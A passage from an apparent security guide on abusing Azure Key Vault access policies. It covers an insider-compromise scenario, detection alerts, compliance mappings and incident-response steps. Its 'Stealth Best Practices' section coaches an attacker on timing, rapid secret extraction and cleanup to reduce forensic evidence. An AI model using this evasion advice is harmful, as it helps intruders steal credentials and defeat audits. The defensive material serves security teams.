- Organization assigns Key Vault Contributor role to infrastructure team at subscription level
- Infrastructure team manages vaults but NOT supposed to access secrets
- Legacy vaults still use Access Policies (migration not completed)
- Compromised infrastructure team member adds themselves to access policies
- Extracts database passwords and API keys from dozens of vaults

**Detection Opportunity:**
- Alert if non-admin user modifies Key Vault access policies
- Flag bulk secret retrieval after access policy changes
- Monitor for service principals added to access policies

---

## 10. OPERATIONAL CONSIDERATIONS

### Stealth Best Practices

1. **Timing:** Modify access policies during business hours to blend with legitimate admin activity
2. **Extraction window:** Extract secrets immediately after policy modification (minimize time window)
3. **Cleanup:** Remove yourself from access policies after extracting data (reduces forensic evidence)
4. **Bulk operations:** Extract from multiple vaults if possible (spreading activity over multiple vaults reduces per-vault suspicion)

### Compliance Implications

Failure to migrate from Access Policies to RBAC violates:
- **CIS Azure Benchmarks:** Section 2.2 (Access Policies should be replaced with RBAC)
- **NIST 800-53:** AC-3 (Access Enforcement), AC-6 (Least Privilege)
- **GDPR:** Art. 32 (Security of Processing)
- **ISO 27001:** A.9.2 (User Access Management)

Organizations must complete this migration to achieve compliance certifications.

### Post-Incident Response

1. **Identify compromised vaults:** Find all vaults modified in the time window of compromise
2. **Audit access policies:** Identify unauthorized principals added to policies
3. **Check sign-in logs:** See if extracted credentials were used to access other resources
4. **Rotate credentials:** All secrets/keys in compromised vaults must be rotated
5. **Migrate to RBAC:** Complete the RBAC migration to prevent future exploits
6. **Enforce MFA:** Require MFA for any Contributor-level operations going forward

